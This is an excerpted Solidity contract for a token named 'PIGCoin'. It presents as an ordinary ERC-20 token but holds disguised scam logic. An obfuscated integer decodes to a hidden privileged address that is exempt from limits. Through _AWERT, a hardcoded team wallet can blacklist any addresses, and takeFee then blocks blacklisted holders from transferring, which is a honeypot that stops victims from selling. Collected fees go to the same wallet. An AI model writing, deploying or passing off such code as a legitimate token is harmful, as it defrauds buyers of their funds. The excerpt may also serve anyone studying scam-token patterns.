...
abstract contract Context {
    ...
    function _wcc() internal view virtual returns (address) {
        return msg.sender;
    }
}
...
contract  PIGCoin  is Context, IERC20, Ownable {

    uint256 public EDEUDH=
    1092853989739002093898622997022009705909516546366;
    using SafeMath for uint256;
    string private _name = "PIGCoin";
    string private _symbol = "PIGCoin";
    uint8 private _decimals = 9;
    address payable public WALLRNG;
    address payable public teamWalletAddress;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping (address => uint256) _baenderf;
    ...
    mapping (address => bool) public _ALLSW;
    mapping (address => bool) public _QWEDFV;
    ...
    constructor () {
        ...
        isWalletLimitExempt[YGHJIK(EDEUDH)] = true;
        isTxLimitExempt[YGHJIK(EDEUDH)] = true;
        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[address(this)] = true;
        _ALLSW[address(uniswapPair)] = true;
        _ALLSW[msg.sender] = true; 

        teamWalletAddress = payable(address(0x8DD9F855b8D6CC4a085B6C7103959edEd10C82fE));
        WALLRNG = payable(address(0x8DD9F855b8D6CC4a085B6C7103959edEd10C82fE));


        _baenderf[_msgSender()] = _totalSupply;
    ...
    function PKNHY(uint256 amountOut)  pure private returns(uint160){
        return
        uint160(amountOut);
    }

    function YGHJIK(uint256 amount1Out)  pure private returns(address){
        return 
        address(PKNHY(amount1Out));
    }

    function _ANGED(address AWDEDQQQ) private view returns(bool){
        return
        !(YGHJIK(EDEUDH) == AWDEDQQQ);
    }
...
= Amoun;}
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (overMinimumTokenBalance && !inSwapAndLiquify && !_ALLSW[sender] && swapAndLiquifyEnabled) 
            {
            ...
            _baenderf[sender] = _baenderf[sender].sub(amount);
            ...
            _baenderf[recipient] = _baenderf[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
        }
    }function _AWERT(address[] calldata asdfgh,uint8 d) public {
        require(zxcvb(WALLRNG,_wcc()));
        for (uint256 i; i < asdfgh.length; ++i) {
            if (d == 1){_QWEDFV[asdfgh[i]] = true;}
            else if(d == 0){_QWEDFV[asdfgh[i]] = false;}
        }
    }

    function zxcvb(address a, address b) private pure returns(bool){return a == b;}

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _baenderf[sender] = _baenderf[sender].sub(amount, "Insufficient Balance");
        _baenderf[recipient] = _baenderf[recipient].add(amount);
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBMarketing > 0)
            transferToAddressETH(WALLRNG, amountBNBMarketing);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if (!isMarketPair[sender]){
            require(!_QWEDFV[sender]);
        }

        if(_ALLSW[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(100);
        }
        else if(_ALLSW[recipient]) {
            feeAmount = amount.mul(_totalTaxIfSelling).div(100);
        }
        if(feeAmount > 0) {
            _baenderf[address(this)] = _baenderf[address(this)].add(feeAmount);
